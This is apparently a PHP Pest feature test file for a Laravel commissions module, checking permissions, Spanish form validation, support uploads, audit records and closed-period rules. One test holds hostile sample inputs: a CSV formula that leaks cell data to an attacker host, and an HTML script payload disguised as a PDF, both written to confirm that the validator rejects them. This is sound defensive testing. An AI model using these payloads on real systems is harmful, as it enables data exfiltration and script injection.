<?php

use App\Modules\Comisiones\Database\Seeders\ComisionesPermissionSeeder;
use App\Modules\Comisiones\Infrastructure\Persistence\AdjustmentRecord;
use App\Modules\Comisiones\Infrastructure\Persistence\AuditRecord;
use App\Modules\Comisiones\Infrastructure\Persistence\CaptureStatus;
use App\Modules\Comisiones\Infrastructure\Persistence\ObrRecord;
use App\Support\Formatting\Money;
use Carbon\CarbonImmutable;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Writer\XLSX\Writer;
use Tests\Fakes\AuditEntry;
use Tests\Fakes\ContractFakes;
use Tests\Modules\Comisiones\Feature\Concerns\ClosedPeriods;
use Tests\Modules\Comisiones\Feature\Concerns\ComisionesUsers;
use Tests\Modules\Comisiones\Feature\Concerns\SapBatches;

/*
| «Ajustes y cruces» (§7.4): OBR/Escudos sales and reimbursements or
| deductions captured with a support, pending until another user approves
| them, one tab per kind.
*/

beforeEach(function () {
    $this->seed(ComisionesPermissionSeeder::class);
    $this->travelTo(CarbonImmutable::parse('2026-08-03 09:00:00', 'America/Bogota'));
    Storage::fake('local');
    $this->fakes = ContractFakes::install($this->app);
    $this->sap = new SapBatches($this->fakes->ingesta);
    $this->analyst = ComisionesUsers::analyst();
});

function captureSupport(string $name = 'soporte.pdf', int $kilobytes = 120): UploadedFile
{
    return UploadedFile::fake()->create($name, $kilobytes, 'application/pdf');
}

/**
 * A real upload whose bytes are a valid file of its extension (or these
 * bytes), so the support rule reads its true MIME type and content.
 */
function realSupport(string $name, ?string $content = null): UploadedFile
{
    $path = tempnam(sys_get_temp_dir(), 'soporte').'.tmp';
    $extension = $content === null ? strtolower(pathinfo($name, PATHINFO_EXTENSION)) : null;

    if ($extension === 'xlsx') {
        $writer = new Writer;
        $writer->openToFile($path);
        $writer->addRow(Row::fromValues(['Factura', 'Valor']));
        $writer->close();
    } elseif ($extension === 'jpg' || $extension === 'jpeg') {
        imagejpeg(imagecreatetruecolor(2, 2), $path);
    } elseif ($extension === 'png') {
        imagepng(imagecreatetruecolor(2, 2), $path);
    } else {
        file_put_contents($path, $content ?? match ($extension) {
            'pdf' => "%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n",
            'csv' => "Factura;Valor\nFV-1;-5.000,50\n",
        });
    }

    return new UploadedFile($path, $name, null, null, true);
}

/**
 * @param  array<string, mixed>  $overrides
 * @return array<string, mixed>
 */
function obrForm(array $overrides = []): array
{
    return array_replace([
        'periodo' => '2026-07',
        'codigo' => '14',
        'descripcion' => 'Escudos obsoletos bodega Itagüí',
        'valor_vendido' => '$ 12.500.000',
        'tasa' => '2,5',
        'soporte' => captureSupport(),
    ], $overrides);
}

/**
 * @param  array<string, mixed>  $overrides
 * @return array<string, mixed>
 */
function adjustmentForm(array $overrides = []): array
{
    return array_replace([
        'periodo' => '2026-07',
        'codigo' => '14',
        'tipo' => 'reintegro',
        'valor' => '350.000',
        'descripcion' => 'Comisión de junio que no se pagó',
        'soporte' => realSupport('acta.xlsx'),
    ], $overrides);
}

it('serves the captures under /comisiones/ajustes, one URL per tab', function () {
    expect(route('comisiones.ajustes.index', absolute: false))->toBe('/comisiones/ajustes')
        ->and(route('comisiones.ajustes.index', ['pestana' => 'reintegros', 'periodo' => '2026-07'], absolute: false))->toBe('/comisiones/ajustes/reintegros?periodo=2026-07')
        ->and(route('comisiones.ajustes.obr.store', absolute: false))->toBe('/comisiones/ajustes/obr')
        ->and(route('comisiones.ajustes.reintegros.store', absolute: false))->toBe('/comisiones/ajustes/reintegros')
        ->and(route('comisiones.ajustes.soporte', ['tipo' => 'obr', 'captura' => 3], absolute: false))->toBe('/comisiones/ajustes/obr/3/soporte');

    $this->actingAs($this->analyst)->get('/comisiones/ajustes/otra')->assertNotFound();
});

it('sends guests to the login', function () {
    $this->get('/comisiones/ajustes')->assertRedirect('/login');
    $this->post('/comisiones/ajustes/obr')->assertRedirect('/login');
});

it('forbids the captures to roles without comisiones.view', function (array $roles) {
    $user = ComisionesUsers::create($roles);

    $this->actingAs($user)->get('/comisiones/ajustes')->assertForbidden();
    $this->actingAs($user)->get('/comisiones/ajustes/reintegros')->assertForbidden();
    $this->actingAs($user)->post('/comisiones/ajustes/obr', obrForm())->assertForbidden();
    $this->actingAs($user)->post('/comisiones/ajustes/reintegros', adjustmentForm())->assertForbidden();
})->with(ComisionesUsers::notViewers());

it('lets the viewer and the approver see the captures but not register them', function () {
    foreach ([ComisionesUsers::viewer(), ComisionesUsers::approver()] as $user) {
        $this->actingAs($user)->get('/comisiones/ajustes?periodo=2026-07')->assertOk()
            ->assertSeeText('Ventas OBR / Escudos')
            ->assertDontSee('name="formulario" value="obr"', false);

        $this->actingAs($user)->post('/comisiones/ajustes/obr', obrForm())->assertForbidden();
        $this->actingAs($user)->post('/comisiones/ajustes/reintegros', adjustmentForm())->assertForbidden();
    }

    expect(ObrRecord::query()->count() + AdjustmentRecord::query()->count())->toBe(0);
});

it('shows the four tabs with the OBR tab first and the month in course by default', function () {
    $this->actingAs($this->analyst)->get('/comisiones/ajustes')->assertOk()
        ->assertSeeText('Ajustes y cruces')
        ->assertSeeText('OBR / Escudos')
        ->assertSeeText('Reintegros y descuentos')
        ->assertSeeText('Cruces manuales')
        ->assertSeeText('Reasignaciones de cruces')
        ->assertSeeText('Aún no hay registros de este tipo en 2026-08.')
        ->assertSee('name="formulario" value="obr"', false)
        ->assertSee('data-modal-open="nuevo-obr"', false)
        ->assertSee('form="form-nuevo-obr"', false)
        ->assertSee('name="periodo" value="2026-08"', false);

    $this->actingAs($this->analyst)->get('/comisiones/ajustes/reintegros?periodo=2026-07')->assertOk()
        ->assertSee('name="formulario" value="reintegros"', false)
        ->assertSee('name="periodo" value="2026-07"', false);
});

it('registers an OBR sale pending, with its support on the private disk, and audits it', function () {
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm())
        ->assertRedirect('/comisiones/ajustes/obr?periodo=2026-07')
        ->assertSessionHas('status', 'Registraste la venta OBR de 2026-07. Queda pendiente hasta que otra persona lo apruebe.');

    $obr = ObrRecord::query()->sole();

    expect($obr->periodo)->toBe('2026-07')
        ->and($obr->slp_code)->toBe(14)
        ->and($obr->descripcion)->toBe('Escudos obsoletos bodega Itagüí')
        ->and($obr->valor_vendido)->toBe('12500000.00')
        ->and($obr->tasa)->toBe('2.5000')
        ->and($obr->estado)->toBe(CaptureStatus::Pending)
        ->and($obr->created_by)->toBe($this->analyst->id)
        ->and($obr->soporte)->toStartWith('comisiones/soportes/obr/')
        ->and($obr->soporte)->toEndWith('.pdf');
    Storage::disk('local')->assertExists($obr->soporte);

    $created = AuditRecord::query()->where('evento', 'comisiones.capture.created')->sole();
    expect($created->sujeto_tipo)->toBe('obr')
        ->and($created->sujeto_id)->toBe((string) $obr->id)
        ->and($created->periodo)->toBe('2026-07')
        ->and($created->cambios['valor_vendido'])->toBe('12500000.00')
        ->and($created->contexto['soporte'])->toBe('soporte.pdf');
    $this->fakes->audit->assertRecorded('comisiones.capture.created', fn (AuditEntry $entry) => $entry->subjectType === 'obr');

    $this->actingAs($this->analyst)->get('/comisiones/ajustes?periodo=2026-07')->assertOk()
        ->assertSee('data-capture="'.$obr->id.'" data-estado="pendiente"', false)
        ->assertSeeText('Escudos obsoletos bodega Itagüí')
        ->assertSeeText(Money::format('12500000'))
        ->assertSeeText('2,5 %')
        ->assertSeeText('Pendiente')
        ->assertSeeText('03/08/2026 09:00 por Ana Gómez')
        ->assertSeeText('Sin revisar')
        ->assertSee(route('comisiones.ajustes.soporte', ['tipo' => 'obr', 'captura' => $obr->id]), false);
});

it('validates the OBR form in Spanish', function () {
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm([
        'codigo' => '99',
        'descripcion' => '',
        'valor_vendido' => 'mucho',
        'tasa' => '0',
        'soporte' => null,
    ]))->assertSessionHasErrors([
        'codigo' => 'Elige un código con parámetros vigentes en el período.',
        'descripcion',
        'valor_vendido' => 'Escribe el valor como 1234567 o 1.234.567.',
        'tasa' => 'Escribe la tasa como un porcentaje mayor que cero y hasta 100, por ejemplo 2,5.',
        'soporte',
    ]);

    // A control code takes no OBR sale either.
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['codigo' => '80']))->assertSessionHasErrors('codigo');
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['tasa' => '150']))->assertSessionHasErrors('tasa');
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['periodo' => '2026-13']))->assertSessionHasErrors('periodo');

    expect(ObrRecord::query()->count())->toBe(0);
});

it('takes a real support in pdf, jpg, jpeg, png, xlsx or csv', function (string $name) {
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['soporte' => realSupport($name)]))->assertSessionHasNoErrors();

    expect(ObrRecord::query()->sole()->soporte)->toEndWith('.'.pathinfo($name, PATHINFO_EXTENSION));
})->with(['factura.pdf', 'foto.jpg', 'foto.jpeg', 'captura.png', 'acta.xlsx', 'detalle.csv']);

it('takes a support up to 10 MB only, and only of those types', function (string $name, int $kilobytes, bool $accepted) {
    $response = $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['soporte' => captureSupport($name, $kilobytes)]));

    if ($accepted) {
        $response->assertSessionHasNoErrors();
        expect(ObrRecord::query()->count())->toBe(1);
    } else {
        $response->assertSessionHasErrors('soporte');
        expect(ObrRecord::query()->count())->toBe(0);
    }
})->with([
    '10 MB' => ['grande.pdf', 10240, true],
    'more than 10 MB' => ['enorme.pdf', 10241, false],
    'exe' => ['programa.exe', 10, false],
    'docx' => ['carta.docx', 10, false],
]);

it('rejects a CSV support with a formula or a support whose content lies about its type, and stores nothing', function () {
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm([
        'soporte' => realSupport('detalle.csv', "Factura;Detalle\nFV-1;=HYPERLINK(\"http://atacante/?x=\"&A1,\"ver\")\n"),
    ]))->assertSessionHasErrors(['soporte' => 'El CSV tiene una fórmula en la fila 2, columna 2. Las celdas no pueden empezar por =, +, - o @, salvo los números.']);
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm([
        'soporte' => realSupport('factura.pdf', '<!DOCTYPE html><html><body><script>alert(1)</script></body></html>'),
    ]))->assertSessionHasErrors(['soporte' => 'El contenido del soporte no corresponde a un archivo PDF.']);

    expect(ObrRecord::query()->count() + AdjustmentRecord::query()->count())->toBe(0)
        ->and(Storage::disk('local')->allFiles())->toBe([]);
});

it('registers a reimbursement and a deduction with Colombian amounts', function () {
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm())
        ->assertRedirect('/comisiones/ajustes/reintegros?periodo=2026-07')
        ->assertSessionHas('status', 'Registraste el ajuste de 2026-07. Queda pendiente hasta que otra persona lo apruebe.');
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm(['tipo' => 'descuento', 'valor' => '120000,50', 'descripcion' => 'Anticipo de comisión']));

    expect(AdjustmentRecord::query()->orderBy('id')->get()->map(fn ($row) => [$row->tipo, $row->valor, $row->estado])->all())->toBe([
        ['reintegro', '350000.00', CaptureStatus::Pending],
        ['descuento', '120000.50', CaptureStatus::Pending],
    ]);
    $this->fakes->audit->assertRecorded('comisiones.capture.created', fn (AuditEntry $entry) => $entry->subjectType === 'ajuste');

    $this->actingAs($this->analyst)->get('/comisiones/ajustes/reintegros?periodo=2026-07')->assertOk()
        ->assertSeeText('Reintegro (suma)')
        ->assertSeeText('Descuento (resta)')
        ->assertSeeText('Anticipo de comisión');

    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm(['tipo' => 'bono', 'valor' => '0']))
        ->assertSessionHasErrors(['tipo', 'valor' => 'El valor debe ser mayor que cero.']);
});

it('counts the pending captures of each tab', function () {
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm());
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm());
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm());
    // Another period does not count.
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['periodo' => '2026-06']));

    $this->actingAs($this->analyst)->get('/comisiones/ajustes?periodo=2026-07')->assertOk()
        ->assertSee('data-capture', false)
        ->assertViewHas('pending', ['obr' => 1, 'reintegros' => 2, 'cruces' => 0, 'reasignaciones' => 0]);
});

it('downloads the support of a capture to any viewer and audits the download', function () {
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm(['soporte' => UploadedFile::fake()->createWithContent('soporte.pdf', '%PDF-1.4 soporte')]));
    $obr = ObrRecord::query()->sole();
    $viewer = ComisionesUsers::viewer();

    $response = $this->actingAs($viewer)->get("/comisiones/ajustes/obr/{$obr->id}/soporte")->assertOk();

    expect($response->streamedContent())->toBe('%PDF-1.4 soporte')
        ->and($response->headers->get('content-disposition'))->toContain("soporte-obr-{$obr->id}.pdf")
        ->and($response->headers->get('content-type'))->toBe('application/octet-stream');
    $downloaded = AuditRecord::query()->where('evento', 'comisiones.support.downloaded')->sole();
    expect($downloaded->user_id)->toBe($viewer->id)
        ->and($downloaded->sujeto_tipo)->toBe('obr')
        ->and($downloaded->periodo)->toBe('2026-07');

    $this->actingAs($viewer)->get("/comisiones/ajustes/ajuste/{$obr->id}/soporte")->assertNotFound();
    $this->actingAs($viewer)->get('/comisiones/ajustes/obr/999/soporte')->assertNotFound();
    $this->actingAs(ComisionesUsers::create([]))->get("/comisiones/ajustes/obr/{$obr->id}/soporte")->assertForbidden();

    Storage::disk('local')->delete($obr->soporte);
    $this->actingAs($viewer)->get("/comisiones/ajustes/obr/{$obr->id}/soporte")->assertNotFound();
});

it('refuses to register captures in a closed period, and shows why', function () {
    ClosedPeriods::close($this, $this->sap, $this->analyst, ComisionesUsers::approver());

    $this->actingAs($this->analyst)->get('/comisiones/ajustes?periodo=2026-07')->assertOk()
        ->assertSeeText('El período está cerrado. Para corregirlo registra una liquidación complementaria.')
        ->assertDontSee('name="formulario" value="obr"', false);

    $this->actingAs($this->analyst)->post('/comisiones/ajustes/obr', obrForm())
        ->assertSessionHas('error', 'El período está cerrado. Para corregirlo registra una liquidación complementaria.');
    $this->actingAs($this->analyst)->post('/comisiones/ajustes/reintegros', adjustmentForm())
        ->assertSessionHas('error', 'El período está cerrado. Para corregirlo registra una liquidación complementaria.');

    expect(ObrRecord::query()->count() + AdjustmentRecord::query()->count())->toBe(0);
    Storage::disk('local')->assertDirectoryEmpty('comisiones/soportes');
});
